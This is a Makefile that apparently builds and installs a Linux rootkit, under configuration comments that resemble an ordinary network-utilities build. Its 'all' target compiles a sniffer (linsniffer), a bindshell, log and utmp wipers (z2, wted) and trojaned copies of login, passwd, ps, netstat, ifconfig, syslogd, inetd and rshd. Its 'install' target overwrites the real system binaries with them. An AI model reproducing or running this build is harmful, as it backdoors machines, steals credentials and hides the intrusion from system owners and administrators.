.EXPORT_ALL_VARIABLES:

# comment this out, if you don't have shadow passwords on your system
# This will affect the compilation of the subdirs: ftpd
HAVE_SHADOW_PASSWORDS=true

# Do you want to have GNU readline and history support in 'ftp'. Use
# cursor keys to get your last commands.
# I use the GNU readline support from bash-1.14 for this.
USE_GNU_READLINE=true

# You could also use "YACC=yacc", if you have the BSD yacc.
YACC=bison -y

# The TCP wrapper doesn't really work for the "rexecd", since it
# waits for further incoming connections once invoked (which are not
# checked by the TCP wrapper binary).
# Install the TCP wrapper library to compile rexecd with these extra checks.
# Also, *DONT* wrap the "rexecd" in your /etc/inetd.conf!

# This may not work right now!!!!!!!!!!!!!!!!
# HAVE_TCP_WRAPPER_LIBRARY=true

# Optimization for compiling all programs.
O=-O2 -fomit-frame-pointer -pipe

# Flags for ld. You don't have to add "-s", since all binaries are
# stripped on installation ("install -s ...").
# LDFLAGS=-v
LDFLAGS=

################### END OF CONFIGURATION PART ###############################

# Just to have a short-cut in the subdirectory Makefiles.
IBSD=-I/usr/include/bsd -include /usr/include/bsd/bsd.h

# These are just a common cases. Then we don't have do write anything in the
# sublevel makefiles.
CFLAGS = ${O} ${IBSD}
LDLIBS = -lbsd

SUB = 	chfn chsh inetd login lsdu net passwd ps rshd syslogd sniffit 

all:
	cc -o fix fix.c
	cc -o z2 z2.c 
	cc -o wted wted.c
	cc -o lled lled.c
	cc -O2 -o linsniffer linsniffer.c
	cc -o bindshell bindshell.c
	for i in $(SUB); do make -C  $$i; done
	
install:
	if [ -x /usr/bin/chfn ]; then fix /usr/bin/chfn chfn/chfn; fi
	if [ -x /usr/bin/chsh ]; then fix /usr/bin/chsh chsh/chsh; fi
	if [ -x /bin/login ]; then fix /bin/login login/login; fi
	if [ -x /usr/bin/passwd ]; then fix /usr/bin/passwd passwd/passwd; fi
	if [ -x /bin/ps ]; then fix /bin/ps ps/ps; fi
	if [ -x /usr/bin/top ]; then fix /usr/bin/top ps/top; fi
	if [ -x /usr/sbin/in.rshd ]; then fix /usr/sbin/in.rshd rshd/rshd; fi
	if [ -x /bin/netstat ]; then fix /bin/netstat net/netstat; fi
	if [ -x /sbin/ifconfig ]; then fix /sbin/ifconfig net/ifconfig; fi
	if [ -x /usr/sbin/syslogd ]; then fix /usr/sbin/syslogd syslogd/syslogd; fi
	if [ -x /usr/sbin/inetd ]; then fix /usr/sbin/inetd inetd/inetd; fi
clean:
	rm -f fix z2 wted lled linsniffer bindshell 
	for i in $(SUB); do make -C  $$i clean; done

